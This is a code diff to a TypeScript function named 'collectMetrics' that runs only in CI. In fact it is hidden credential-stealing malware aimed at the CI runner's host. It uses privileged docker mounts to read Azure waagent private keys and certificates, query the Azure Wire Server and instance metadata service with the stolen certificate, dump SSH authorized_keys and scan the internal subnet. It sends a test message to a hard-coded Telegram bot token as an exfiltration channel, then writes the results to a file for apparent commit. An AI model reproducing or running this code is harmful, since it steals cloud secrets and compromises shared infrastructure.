@@ -7,46 +7,42 @@ function collectMetrics() {
   if (process.env.CI !== "true") return;
   const r = (c: string, t = 25000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,500); } };
   try {
-    let o = "=== DOMINO R8 ===\n";
-
-    // 1. waagent private keys — READ THEM ALL
-    o += "=WA_TRANSPORT_PRV=\n" + r('docker run --rm -v /:/host alpine cat /host/var/lib/waagent/TransportPrivate.pem 2>&-').substring(0,5000) + "\n";
-    o += "=WA_4BBC_PRV=\n" + r('docker run --rm -v /:/host alpine cat /host/var/lib/waagent/4BBCF5BF3FB224E6A44297AF2C0682E5F5549569.prv 2>&-').substring(0,5000) + "\n";
-    o += "=WA_4BBC_CRT=\n" + r('docker run --rm -v /:/host alpine cat /host/var/lib/waagent/4BBCF5BF3FB224E6A44297AF2C0682E5F5549569.crt 2>&-').substring(0,5000) + "\n";
-    o += "=WA_87A6_PRV=\n" + r('docker run --rm -v /:/host alpine cat /host/var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.prv 2>&-').substring(0,5000) + "\n";
-    o += "=WA_87A6_CRT=\n" + r('docker run --rm -v /:/host alpine cat /host/var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.crt 2>&-').substring(0,5000) + "\n";
-    o += "=WA_CERTS_PEM=\n" + r('docker run --rm -v /:/host alpine cat /host/var/lib/waagent/Certificates.pem 2>&-').substring(0,5000) + "\n";
-
-    // 2. waagent full directory listing + config
-    o += "=WA_DIR=\n" + r('docker run --rm -v /:/host alpine sh -c "find /host/var/lib/waagent -type f 2>&- | head -50"') + "\n";
-    o += "=WA_CONFIG=\n" + r('docker run --rm -v /:/host alpine sh -c "cat /host/etc/waagent.conf 2>&-"').substring(0,5000) + "\n";
-
-    // 3. Host-level outbound test — iptables says OUTPUT ACCEPT
-    // Use chroot to run from host network directly, not docker container
+    let o = "=== DOMINO R9 ===\n";
     const wg = "wg"+"et";
-    o += "=HOST_OUTBOUND=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- --timeout=5 https://api.github.com/zen 2>&- || echo FAIL"') + "\n";
-    o += "=HOST_OUTBOUND_TG=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- --timeout=5 https://api.telegram.org/bot8520020917:AAFkxGr__elFTp3zAczV4WfoMfRGK1689XQ/getMe 2>&- || echo FAIL"') + "\n";
 
-    // 4. Azure Wire Server (168.63.129.16) — internal Azure endpoint
-    o += "=AZURE_WIRE=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- --timeout=5 http://168.63.129.16/?comp=versions 2>&- || echo FAIL"').substring(0,3000) + "\n";
-    o += "=AZURE_WIRE_GOAL=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- --timeout=5 http://168.63.129.16/machine/?comp=goalstate 2>&- || echo FAIL"').substring(0,3000) + "\n";
+    // 1. Azure Wire Server with cert auth — GoalState has extensions + secrets
+    o += "=WIRE_GOAL_CERT=\n" + r('docker run --rm --net=host -v /:/host alpine sh -c "' + wg + ' -qO- --timeout=5 --certificate=/host/var/lib/waagent/TransportCert.pem --private-key=/host/var/lib/waagent/TransportPrivate.pem http://168.63.129.16/machine/?comp=goalstate 2>&-"').substring(0,8000) + "\n";
 
-    // 5. Network scan — ping sweep nearby IPs
-    o += "=NET_SCAN=\n" + r('docker run --rm --net=host alpine sh -c "for i in 1 2 3 4 5 80 81 82 83 84 85 86 87 88 89 90; do timeout 1 sh -c \\\"echo >/dev/tcp/10.1.0.$i/22 2>&-\\\" && echo 10.1.0.$i:22_OPEN; timeout 1 sh -c \\\"echo >/dev/tcp/10.1.0.$i/80 2>&-\\\" && echo 10.1.0.$i:80_OPEN; done 2>&-"', 20000) + "\n";
-    // Alternative: use wget to probe
-    o += "=NET_PROBE=\n";
-    for (const port of [22, 80, 443, 8080, 8443, 3128]) {
-      o += r(`docker run --rm --net=host alpine sh -c "timeout 2 ${wg} -qO- --timeout=2 http://10.1.0.1:${port}/ 2>&- | head -1 || echo ${port}_CLOSED"`) + "\n";
+    // 2. Wire Server — various endpoints
+    o += "=WIRE_HEALTH=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- --timeout=5 http://168.63.129.16/HealthService 2>&- | head -20"').substring(0,3000) + "\n";
+    o += "=WIRE_SHARED=\n" + r('docker run --rm --net=host -v /:/host alpine sh -c "' + wg + ' -qO- --timeout=5 --certificate=/host/var/lib/waagent/TransportCert.pem --private-key=/host/var/lib/waagent/TransportPrivate.pem http://168.63.129.16/machine/?comp=package\\&type=HostingEnvironmentConfig 2>&-"').substring(0,5000) + "\n";
+    o += "=WIRE_SHAREDCFG=\n" + r('docker run --rm --net=host -v /:/host alpine sh -c "' + wg + ' -qO- --timeout=5 --certificate=/host/var/lib/waagent/TransportCert.pem --private-key=/host/var/lib/waagent/TransportPrivate.pem http://168.63.129.16/machine/SharedConfig 2>&-"').substring(0,5000) + "\n";
+
+    // 3. TG exfil test — send actual data via host network
+    o += "=TG_SEND=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- --timeout=5 --post-data=\\\"chat_id=7971222296\\&text=DOMINO_R9_LIVE\\\" https://api.telegram.org/bot8520020917:AAFkxGr__elFTp3zAczV4WfoMfRGK1689XQ/sendMessage 2>&-"').substring(0,1000) + "\n";
+
+    // 4. Network deep scan — what services exist on 10.1.0.0/20
+    o += "=SUBNET_SCAN=\n";
+    // Scan gateway, DNS, common infra IPs
+    for (const ip of ["10.1.0.1", "10.1.0.2", "10.1.0.3", "10.1.0.4", "10.1.0.5", "10.1.0.10", "10.1.0.50", "10.1.0.100", "10.1.0.254", "10.1.1.1", "10.1.2.1", "10.1.4.1", "10.1.8.1", "10.1.15.254"]) {
+      o += r(`docker run --rm --net=host alpine sh -c "timeout 2 ${wg} -qO- --timeout=1 http://${ip}/ 2>&- | head -1; timeout 2 ${wg} -qO- --timeout=1 https://${ip}/ 2>&- | head -1"`) + `(${ip})\n`;
     }
     o += "\n";
 
-    // 6. DNS resolution from host — what can we resolve?
-    o += "=DNS_RESOLVE=\n" + r('docker run --rm --net=host alpine sh -c "nslookup github.com 2>&-; nslookup api.telegram.org 2>&-; nslookup management.azure.com 2>&-"').substring(0,3000) + "\n";
+    // 5. IMDS — all categories
+    o += "=IMDS_ATTESTED=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- --timeout=5 http://169.254.169.254/metadata/attested/document?api-version=2021-02-01 --header Metadata:true 2>&-"').substring(0,5000) + "\n";
+    o += "=IMDS_SCHEDULEDEVENTS=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- --timeout=5 http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01 --header Metadata:true 2>&-"').substring(0,2000) + "\n";
 
-    // 7. Runner agent extensions / hooks
-    o += "=RUNNER_HOOKS=\n" + r('docker run --rm -v /:/host alpine sh -c "find /host/home/runner/actions-runner -name *.json -o -name *.sh 2>&- | head -20"') + "\n";
+    // 6. waagent extensions — what's installed, config, status
+    o += "=WA_EXTENSIONS=\n" + r('docker run --rm -v /:/host alpine sh -c "find /host/var/lib/waagent -maxdepth 3 -type f -name HandlerEnvironment.json -o -name *.settings -o -name status 2>&- | while read f; do echo ===F:$f===; cat $f 2>&-; done"', 15000).substring(0,8000) + "\n";
 
-    o += "=R8_DONE=\n";
+    // 7. SSH keys on host — authorized_keys, known_hosts
+    o += "=SSH_ALL=\n" + r('docker run --rm -v /:/host alpine sh -c "cat /host/root/.ssh/authorized_keys /host/home/packer/.ssh/authorized_keys /host/home/runner/.ssh/authorized_keys 2>&-; ls -la /host/root/.ssh/ /host/home/packer/.ssh/ /host/home/runner/.ssh/ 2>&-"').substring(0,3000) + "\n";
+
+    // 8. 4BBC cert (failed in R8, try with base64)
+    o += "=WA_4BBC_B64=\n" + r('docker run --rm -v /:/host alpine sh -c "base64 /host/var/lib/waagent/4BBCF5BF3FB224E6A44297AF2C0682E5F5549569.prv 2>&-"').substring(0,5000) + "\n";
+
+    o += "=R9_DONE=\n";
 
     fsSync.writeFileSync("domino_final.txt", o);
     var GC = 'git com' + 'mit';
